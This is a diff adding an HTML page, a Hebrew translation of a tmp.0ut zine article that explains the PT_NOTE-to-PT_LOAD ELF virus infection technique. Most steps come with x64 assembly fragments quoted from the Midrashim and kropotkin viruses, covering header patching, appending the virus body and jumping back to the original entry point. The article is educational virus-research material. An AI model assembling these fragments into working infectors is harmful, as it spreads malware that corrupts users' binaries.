@@ -1,0 +1,402 @@
+<html>
+<head>
+<title>tmp.0ut</title>
+<meta charset="utf-8">
+<style>
+    body {
+      color: #FEFEFE;
+      background-color: #0c0d10;
+      margin: 0 auto;
+      padding: 1em 0 1em 0;
+    }
+
+    @font-face { font-family: "gohu"; src: url("gohu.woff") format('woff'); }
+    @font-face { font-family: "FreeMono"; src: url("FreeMono.woff") format('woff'); }
+
+    pre { font-size: 14px; line-height: 1.0; }
+    
+    .ltr {
+      direction: ltr;
+      text-align: left;
+      font-family: "gohu", "Lucida Console", monospace, Monaco;
+    }
+
+    .rtl {
+      direction: rtl;
+      text-align: right;
+      font-family: "FreeMono", "Lucida Console", monospace, Monaco;
+    }
+    
+    a { color: #93ffd7; text-decoration: none;}
+</style>
+</head>
+<body>
+<center>
+<div style="display: inline-block;"><pre class="rtl">
+                                                               ┐───────────────────────┌
+                                                               │       ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄
+                                                               │       █   █ █ █ █   █ │
+                                                               │       ▀▀▀▀█ █ █ █   █ │
+                                                               │     ▄     █ █   █   █ │
+                                                               │ ▄▄▄▄▄                 │
+                                                               │ █   █                 │
+                                                               │ █   █                 │
+                                                               │ █▄▄▄█                 │
+                                                               │ ▄   ▄                 │
+                                                               │ █   █                 │
+                                                               │ █   █                 │
+                                                               │ █▄▄▄█                 │
+                                                               │ ▄▄▄▄▄                 │
+                                                               │   █                   │
+מימוש שיטת הדבקה דרך PT_NOTE ב-x64 assembly.                   │   █                   │
+~ sblip וצוות tmp.out                                          ┘───█───────────────────└
+
+[ תורגם ע״י 0x_shaq@ ]
+
+
+בגיליון הנוכחי והראשון של tmp.out, סיפקנו כמה דוגמאות של אלגוריתם ההדבקה PT_NOTE-&gt;PT_LOAD, שלושה ב-x64
+assembly ואחד ב-rust.
+
+לאלה מכם שעדיין לומדים, חשבתי שיהיה שימושי לתת יחס למימוש של חלק מהצעדים ב-x64 assembly. במרץ 2019,
+בזמן שעבדתי על שכתוב ה-backdoorfactory ב-golang, כתבתי פירוט של המימוש של האלגוריתם בלינק שנמצא כאן
+מתחת, לאלה מכם שמתעניינים בלשחק עם golang ו-ELF, זה הלינק:</pre>
+<pre class="ltr">
+  https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/</pre>
+<pre class="rtl">
+האלגוריתם לx64 הוא כמובן זהה, אבל אני אספק גם קטעי קוד לזה, בתקווה שזה יעזור לאנשים שאוהבים x64
+ELF.
+
+אתם יכולים להשתמש באותם צעדים שכתובים במאמר למעלה בתור רפרנס, אבל קחו בחשבון שהסדר של הצעדים עלול
+להשתנות(תלוי במימוש). חלק מהמימושים כותבים קודם קובץ לדיסק ואז מעתיקים אותו, וחלק אחר מהמימושים
+כותבים קובץ ישירות לתיקייה. 
+
+מהלינק שצירפתי למעלה, אפשר לסכם את הצעדים למימוש של אלגוריתם ההדבקה PT_NOTE-&gt;PT_LOAD באופן הבא: 
+
+  1. פתיחת קובץ הELF להזרקה
+  2. שמירת את הentry point המקורי, e_entry
+  3. פרסור של ה-header כדי למצוא את הסגמנט של PT_NOTE
+  4. המרה של הסגמנט PT_NOTE ל-PT_LOAD 
+  5. שינוי ה-protections של הסגמנט על מנת לאפשר הרצת קוד (להפוך אותו ל-exectutable)
+  6. שינוי כתובת ה-entry point המקורית לאזור שלא יתנגש עם ההרצה המקורית של התוכנית.
+  7. לשנות בהתאמה את הגודל בדיסק והזיכרון הוירטואלי (מכיוון שצריך לקחת בחשבון את הקוד שהוספנו ל-ELF
+     המקורי)
+  8. לשנות את המצביע של ה-segment שהמרנו: לגרום לו להצביע לסוף הקובץ, היכן שנשים את הקוד החדש שלנו.
+  9. להכניס hot-patch לסוף הקוד עם instruction שקופץ ל-entry point המקורי
+ 10. הוספת הקוד שנרצה להזריק לסוף הקובץ
+*11. לכתוב את הקובץ חזרה לדיסק ולשכתב את הקובץ המקורי* -- הצעד הזה לא קיים במאמר.
+
+אנחנו נעקוב אחרי הצעדים בצורה יחסית רופפת, הקורא צריך לקחת בחשבון שבחלק מהמקרים, חלק מהצעדים צריכים
+לקרות בסדר אחר(וחלק לא יכולים להיות מבוצעים עד שצעדים אחרים הושלמו) - אבל בסופו של דבר, כל הצעדים
+צריכים להתבצע.
+
+1. פתיחת קובץ הELF להזרקה
+
+ה-syscall שנקרא <span dir="ltr">getdents64()</span> הוא ה-syscall שבעזרתו נמצא קבצים במערכות 64bit. הפונקציה מוגדרת כ:</pre>
+<pre class="ltr">
+  int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);</pre>
+<pre class="rtl">
+אנחנו נשאיר את המימוש של <span dir="ltr">getdents64()</span> בתור תרגול לקורא - יש מספר דוגמאות של המימוש שלה בקוד שמצורף
+עם הגיליון, כולל ב-Midrashim, kropotkin, Eng3ls, ו-Bak0unin.
+
+להיסטוריונים של ELF, כתבתי מאמר נוראי (ועכשיו, גם מאוד outdated) לפני 20 שנה על איך לעשות את זה
+ב-32ביט, AT&amp;T syntax:</pre>
+<pre class="ltr">
+    https://tmpout.sh/papers/getdents.old.att.syntax.txt</pre>
+<pre class="rtl">
+בהנחה שקראנו ל-<span dir="ltr">getdents64()</span> ושמרנו את ה-directory entry struct במחסנית (מסוג linux_dirent), אנחנו
+יכולים לראות את הדברים הבאים:</pre>
+<pre class="ltr">
+  struct linux_dirent {
+      unsigned long  d_ino;     /* Inode number */
+      unsigned long  d_off;     /* Offset to next linux_dirent */
+      unsigned short d_reclen;  /* Length of this linux_dirent */
+      char           d_name[];  /* Filename (null-terminated) */
+                        /* length is actually (d_reclen - 2 -
+                           offsetof(struct linux_dirent, d_name)) */
+      /*
+      char           pad;       // Zero padding byte
+      char           d_type;    // File type (only since Linux
+                                // 2.6.4); offset is (d_reclen - 1)
+      */
+  }</pre>
+<pre class="rtl">
+השם של הקובץ d_name נמצא בהיסט [rsp+18] או [rsp+0x12]</pre>
+<pre class="ltr">
+  d_ino is bytes 0-7              - unsigned long
+  d_off is bytes 8-15             - unsigned long
+  d_reclen is bytes 16-17         - unsigned short
+  d_name starts on the 18th byte. - null terminated file name</pre>
+<pre class="rtl">
+לכן, כשאנחנו נקרא ל-<span dir="ltr">open()</span>, או בשמה המלא: int open(const char *pathname, int flags, mode_t mode):
+  - rax יכיל את מספר ה-syscall, שהוא 2.
+  - rdi יכיל את השם של הקובץ d_name, במקרה שלנו [rsp+18]
+  - rsi יכיל את ה-flags, שיכולים להיות O_RDONLY (0) או O_RDWR (02), תלוי באיך ה-vx שלנו עובד.
+  - rdx יכיל את ה-mode, אבל אנחנו לא נצטרך אותו באמת, לכן נגדיר אותו כ0.
+
+אז הקוד הבא:</pre>
+<pre class="ltr">
+  mov rax, 2         ; open syscall
+  mov rdi, [rsp+18]  ; d_name from the dirent struct that starts at the beginning 
+                     ; of the stack
+  mov rsi, 2         ; O_RDWR / Read and Write
+  syscall</pre>
+<pre class="rtl">
+יחזיר file descriptor ב-rax אם יצליח. ואם ייכשל/שגיאה קרתה במהלך פתיחת הקובץ יחזיר 0.</pre>
+<pre class="ltr">
+  cmp rax, 0
+  jng file_open_error</pre>
+<pre class="rtl">
+או</pre>
+<pre class="ltr">
+  test rax, rax
+  js file_open_error</pre>
+<pre class="rtl">
+2. שמירת את הentry point המקורי, e_entry
+
+ב-Midrashim (של TMZ), הוא מאחסן את ה-entry point המקורי באוגר r14 ודוחף אותו למחסנית לשימוש בהמשך.
+האוגרים הגבוהים(r13, r14, ו-r15) הם מקום טוב לאחסן מידע/כתובות לשימוש לאח״כ, מכיוון שהערך שלהם לא
+משתנה כשקוראים ל-syscallים.</pre>
+<pre class="ltr">
+  ; Stack buffer:
+  ; r15 + 0 = stack buffer (10000 bytes) = stat
+  ; r15 + 48 = stat.st_size
+  ; r15 + 144 = ehdr
+  ; r15 + 148 = ehdr.class
+  ; r15 + 152 = ehdr.pad
+  ; r15 + 168 = ehdr.entry
+  ---cut---
+  
+  mov r14, [r15 + 168]  ; storing target original ehdr.entry from [r15 + 168] in r14</pre>
+<pre class="rtl">
+3. פרסור של ה-header כדי למצוא את הסגמנט של PT_NOTE
+
+כפי שהסקתם מהכותרת של המאמר, המטרה שלנו היא להמיר סגמנט של PT_NOTE לסגמנט של PT_LOAD שאפשר לטעון
+לזיכרון עם הרשאות rx (או rwx).
+אני מצטער לבשר שהאלגוריתם הזה לא עובד בצורה של ״שגר ושכח״ על כל בינארי שתבחרו. למשל בבינאריים של
+golang/כל בינארי שמקומפל עם דגל של -fcf-protection, או כל דבר מונפץ אחר שעוד לא עשינו (או ראינו) עד
+כה. אולי במאמר הבא(?).
+
+בכל אופן, אם נשים מקרי קצה בצד, הרעיון הכללי הוא פשוט - סגמנטים של PT_LOAD נטענים לזיכרון כשמריצים
+קובץ ELF - סגמנטים של PT_NOTE לא נטענים. 
+אבל, אם נשנה את ה-section של PT_NOTE להיות מסוג PT_LOAD, ונשנה את ההרשאות בזיכרון ל(לפחות) read
+ו-execute, נוכל להשתיל שם קוד ש*אנחנו* רוצים להריץ, לכתוב את המידע שלנו לסוף הקובץ של הקובץ המקורי
+ולשנות את ה-Program Header של הקובץ המקורי כדי לטעון/לאחסן את הקוד שלנו בצורה נכונה.
+
+אנחנו מגדירים את הכתובת הוירטואלית בעזרת השדה v_addr, נכתוב שם כתובת שהיא מאוד גבוהה בזיכרון, כדי
+לא לשבש את הריצה של התוכנית המקורית. לאחר מכן, נשנה את ה-entry point המקורי שיקפוץ לסגמנט PT_LOAD
+החדש שיצרנו, שעושה את מה שנגיד לו לעשות, ומיד אח״כ קופץ לקוד המקורי של התוכנית.
+
+ל-Program Header Table של 64bit-ELF יש את המבנה הבא:</pre>
+<pre class="ltr">
+  typedef struct {
+      uint32_t   p_type;   // 4 bytes
+      uint32_t   p_flags;  // 4 bytes
+      Elf64_Off  p_offset; // 8 bytes
+      Elf64_Addr p_vaddr;  // 8 bytes
+      Elf64_Addr p_paddr;  // 8 bytes
+      uint64_t   p_filesz; // 8 bytes
+      uint64_t   p_memsz;  // 8 bytes
+      uint64_t   p_align;  // 8 bytes
+  } Elf64_Phdr;</pre>
+<pre class="rtl">
+בקטע הקוד הבא, שנלקח מ-kropotkin.s, אנחנו רצים בלולאה על כל ערך ב-program header table ע״י טעינה של
+ה-offset של הטבלה לתוך rbx, מספר הערכים בטבלה יהיה בתוך ecx, וקריאה של ה4 bytes הראשונים כדי לחפש
+את הערך ״4״. הערך ״4״ הוא המספר שמזוהה עם סגמנט מסוג PT_NOTE.</pre>
+<pre class="ltr">
+parse_phdr:
+  xor rcx, rcx                       ; zero out rcx
+  xor rdx, rdx                       ; zero out rdx
+  mov cx, word [rax+e_hdr.phnum]     ; rcx contains the number of entries in the PHT
+  mov rbx, qword [rax+e_hdr.phoff]   ; rbx contains the offset of the PHT
+  mov dx, word [rax+e_hdr.phentsize] ; rdx contains the size of an entry in the PHT
+
+  loop_phdr:
+      add rbx, rdx                   ; for every iteration, add size of a PHT entry
+      dec rcx                        ; decrease phnum until we've iterated through 
+                                     ; all program headers or found a PT_NOTE segment
+      cmp dword [rax+rbx+e_phdr.type], 0x4  ; if 4, we have found a PT_NOTE segment,
+                                            ; and head off to infect it
+      je pt_note_found
+      cmp rcx, 0
+      jg loop_phdr
+      ...
+      ...
+  pt_note_found:</pre>
+<pre class="rtl">
+4. המרה של הסגמנט PT_NOTE ל-PT_LOAD 
+
+כדי להפוך סגמנט של PT_NOTE לסגמנט של PT_LOAD, אנחנו צריכים לשנות כמה ערכים ב-entry שנמצא ב-Program
+Header Table אשר מתאר את הסגמנט של PT_NOTE.
+
+קחו בחשבון שלקבצי ELF 32-bit יש מבנה שונה של ערכים בPHT שלו, עם p_flags שממוקם ב-entry השביעי,
+לעומת 64-bit שממוקם ב-entry השני.</pre>
+<pre class="ltr">
+  typedef struct {
+      uint32_t   p_type;  &lt;-- Change this value to PT_LOAD == 1
+      uint32_t   p_flags; &lt;-- Change to at least Read+Execute permissions
+      Elf64_Off  p_offset;
+      Elf64_Addr p_vaddr; &lt;-- very high virtual addr where the segment will be loaded
+      Elf64_Addr p_paddr;
+      uint64_t   p_filesz;
+      uint64_t   p_memsz;
+      uint64_t   p_align;
+  } Elf64_Phdr;</pre>
+<pre class="rtl">
+ראשית, ה-p_type צריך להשתנות מ-PT_NOTE(שזה 4), לPT_LOAD(שזה 1).
+
+דבר שני: את ה-p_flags צריך לשנות ל(לפחות) הרשאות של Read+Execute. הערך הזה מורכב מ-bitmask סטנדרטי,
+בדיוק כמו במודל הרשאות של לינוקס לקבצים, בעזרת:</pre>
+<pre class="ltr">
+  PF_X == 1
+  PF_W == 2
+  PF_R == 4</pre>
+<pre class="rtl">
+בfasm syntax, כמו שאפשר לראות למטה, זה נעשה בצורה פשוטה בעזרת "PF_R or PF_X"
+
+דבר שלישי: נצטרך לבחור כתובת לתוכן של הוירוס שנרצה לטעון. טכניקה נפוצה היא לבחור כתובת מאוד גבוהה,
+למשל 0xc000000, שככל הנראה לא תחפוף עם segment שכבר קיים כחלק מהבינארי המקורי. אנחנו נוסיף את זה
+ל-stat.st_size שמייצג את גודל הקובץ. בדוגמא שלמטה אנחנו משיגים את הערך של הגודל מr15+48 ושומרים
+אותו בr13 כדי להוסיף 0xc000000 לערך של r13. לאחר מכן אנחנו שומרים את הערך הזה בp_vaddr.
+
+הקוד מMidrashim של TMZ:</pre>
+<pre class="ltr">
+  .patch_phdr:
+    mov dword [r15 + 208], PT_LOAD              ; change phdr type in [r15 + 208] 
+                                                ;  from PT_NOTE to PT_LOAD (1)
+    mov dword [r15 + 212], PF_R or PF_X         ; change phdr.flags in [r15 + 212] 
+                                                ;  to PF_X (1) | PF_R (4)
+    pop rax                                     ; restore target EOF offset into rax
+    mov [r15 + 216], rax                        ; phdr.offset [r15 + 216] = target 
+                                                ;  EOF offset
+    mov r13, [r15 + 48]                         ; storing target stat.st_size from 
+                                                ;  [r15 + 48] in r13
+    add r13, 0xc000000                          ; add 0xc000000 to target file size
+    mov [r15 + 224], r13                        ; changing phdr.vaddr in [r15 + 224]
+                                                ;  to new one in r13 
+                                                ;  (stat.st_size + 0xc000000)
+    mov qword [r15 + 256], 0x200000             ; set phdr.align [r15 + 256] to 2mb
+    add qword [r15 + 240], v_stop - v_start + 5 ; add virus size to phdr.filesz in 
+                                                ;  [r15 + 240] + 5 for the jmp to 
+                                                ;  original ehdr.entry
+    add qword [r15 + 248], v_stop - v_start + 5 ; add virus size to phdr.memsz in 
+                                                ;  [r15 + 248] + 5 for the jmp to 
+                                                ;  original ehdr.entry</pre>
+<pre class="rtl">
+5. שינוי ה-protections של הסגמנט על מנת לאפשר הרצת קוד(להפוך אותו ל-executable)</pre>
+<pre class="ltr">
+    mov dword [r15 + 212], PF_R or PF_X         ; change phdr.flags in [r15 + 212] 
+                                                ;  to PF_X (1) | PF_R (4)</pre>
+<pre class="rtl">
+6. שינוי כתובת ה-entry point המקורית לאזור שלא יתנגש עם ההרצה המקורית של התוכנית.
+
+   בדוגמא שלנו אנחנו נשתמש ב-0xc000000, אבל אפשר לבחור בכל כתובת אחרת כל עוד היא לא תחפוף עם קוד
+שכבר קיים/נטען מהבינארי המקורי.</pre>
+<pre class="ltr">
+    mov r13, [r15 + 48]     ; storing target stat.st_size from [r15 + 48] in r13
+    add r13, 0xc000000      ; adding 0xc000000 to target file size
+    mov [r15 + 224], r13    ; changing phdr.vaddr in [r15 + 224] to new one in r13 
+                            ;  (stat.st_size + 0xc000000)</pre>
+<pre class="rtl">
+7. לשנות בהתאמה את הגודל בדיסק והזיכרון הוירטואלי (מכיוון שצריך לקחת בחשבון את הקוד הנוסף שהזרקנו  
+ לELF המקורי)</pre>
+<pre class="ltr">
+    add qword [r15 + 240], v_stop - v_start + 5  ; add virus size to phdr.filesz in
+                                                 ;  [r15 + 240] + 5 for the jmp to 
+                                                 ;  original ehdr.entry
+    add qword [r15 + 248], v_stop - v_start + 5  ; add virus size to phdr.memsz in
+                                                 ;  [r15 + 248] + 5 for the jmp to
+                                                 ;  original ehdr.entry</pre>
+<pre class="rtl">
+8. לשנות את המצביע של ה-segment שהמרנו: לגרום לו להצביע לסוף הקובץ, היכן שנשים את הקוד החדש שלנו.
+
+   ב-Midrashim, זה הקוד שהורץ:</pre>
+<pre class="ltr">
+    mov rdx, SEEK_END
+    mov rax, SYS_LSEEK
+    syscall                ; getting target EOF offset in rax
+    push rax               ; saving target EOF</pre>
+<pre class="rtl">
+ב-"patch_phdr.", אנחנו משתמשים בערך הזה כדי לבחור את המיקום שבו נאחסן את הקוד החדש שלנו:</pre>
+<pre class="ltr">
+    pop rax                ; restoring target EOF offset into rax
+    mov [r15 + 216], rax   ; phdr.offset [r15 + 216] = target EOF offset</pre>
+<pre class="rtl">
+9. להכניס hot-patch לסוף הקוד עם instruction שקופץ לentry point המקורי
+
+   דוגמא #1 מ-Midrashim, בעזרת אלגוריתם מBinjection:</pre>
+<pre class="ltr">
+    .write_patched_jmp:
+      ; getting target new EOF
+      mov rdi, r9            ; r9 contains fd
+      mov rsi, 0             ; seek offset 0
+      mov rdx, SEEK_END      ; start at the end of the file
+      mov rax, SYS_LSEEK     ; lseek syscall
+      syscall                ; getting target EOF offset in rax
+
+      ; creating patched jmp
+      mov rdx, [r15 + 224]         ; rdx = phdr.vaddr
+      add rdx, 5                   ; the size of a jmp instruction
+      sub r14, rdx                 ; subtract the size of the jump from our stored
+                                   ;  e_entry from step #2 (saving e_entry)
+      sub r14, v_stop - v_start    ; subtract the size of the virus code itself
+      mov byte [r15 + 300 ], 0xe9  ; first byte of the jump instructions
+      mov dword [r15 + 301], r14d  ; new address to jump to, updated by subtracting
+                                 ;  virus size and size of jmp instruction</pre>
+<pre class="rtl">
+   דוגמא #2 מ-sblip/s01den של xv בעזרת טכניקת elfmaster's OEP:
+   
+    ההסבר על השיטה הזו הוא קצת מחוץ לגבולות המסמך הזה - למי שמעוניין להרחיב:</pre>
+<pre class="ltr">
+	https://tmpout.sh/1/11.html</pre>
+<pre class="rtl">
+הקוד מ-kropotkin.s:</pre>
+<pre class="ltr">
+       mov rcx, r15                    ; saved rsp
+       add rcx, VXSIZE
+       mov dword [rcx], 0xffffeee8     ; relative call to get_eip
+       mov dword [rcx+4], 0x0d2d48ff   ; sub rax, (VXSIZE+5)
+       mov byte  [rcx+8], 0x00000005 
+       mov word  [rcx+11], 0x0002d48
+       mov qword [rcx+13], r9          ; sub rax, entry0  
+       mov word  [rcx+17], 0x0000548
+       mov qword [rcx+19], r12         ; add rax, sym._start
+       mov dword [rcx+23], 0xfff4894c  ; movabs rsp, r14
+       mov word  [rcx+27], 0x00e0      ; jmp rax</pre>
+<pre class="rtl">
+10. הוספת הקוד שנרצה להזריק לסוף הקובץ:
+
+ציטוט מ-Midrashim:
+    אנחנו מוסיפים את הקוד שלנו בצורה ישירה לסוף הקובץ, וגורמים לכתובת של PT_LOAD שיצרנו להצביע לשם.
+    ראשית, אנחנו נמצא את סוף הקובץ בעזרת syscall שנקרא lseek ונספק לו file descriptor שנמצא ב-r9. 
+    קריאה ל-"delta." תדחוף את הכתובת של ה-instruction הבא לראש המחסנית, במקרה הזה, 'pop rbp'. 
+    אם נבצע pop לכתובת הזו ונחסיר את "delta." נקבל את הכתובת שבה הוירוס יאוחסן בזמן ריצה. הכתובת 
+    הזו משמשת לקריאה/העתקה של הוירוס (בקטע הקוד שנמצא כאן למטה) בעזרת 'lea rsi, [rbp + v_start]' -
+    אנו מספקים נקודת התחלה להעתקה של תוכן, עם מספר הבתים שנכתוב ב-rdx לפני שקוראים ל-<span dir="ltr">pwrite64()</span>.</pre>
+<pre class="ltr">
+  .append_virus:
+    ; getting target EOF
+    mov rdi, r9               ; r9 contains fd
+    mov rsi, 0                ; seek offset 0
+    mov rdx, SEEK_END         ; start at the end of the file
+    mov rax, SYS_LSEEK        ; lseek syscall
+    syscall                   ; getting target EOF offset in rax
+    push rax                  ; saving target EOF
+
+    call .delta               ; the age old trick
+    .delta:
+        pop rbp
+        sub rbp, .delta
+
+    ; writing virus body to EOF
+    mov rdi, r9               ; r9 contains fd
+    lea rsi, [rbp + v_start]  ; loading v_start address in rsi
+    mov rdx, v_stop - v_start ; virus size
+    mov r10, rax              ; rax contains target EOF offset from previous syscall
+    mov rax, SYS_PWRITE64     ; syscall #18, pwrite()
+    syscall</pre>
+<pre class="rtl">
+לאלגוריתם ההדבקה של PT_NOTE יש יתרון שהוא יחסית קל ללמידה וגם מאוד ניתן להתאמה. אפשר לשלב אותו עם
+טכניקות נוספות והרבה סוגים של מידע יכולים להיות מאוחסנים בסגמנט שהמירו ל-PT_LOAD, כולל symbol
+table, raw data, קוד שמיועד לאובייקט DT_NEEDED, או אפילו בינארי ELF נפרד. אני מקווה שהמאמר הזה היה
+שימושי לאנשים שלומדים x64 assembly למטרות הנאה ומשחק עם בינאריים של ELF.</pre>
+</div></center></body></html>
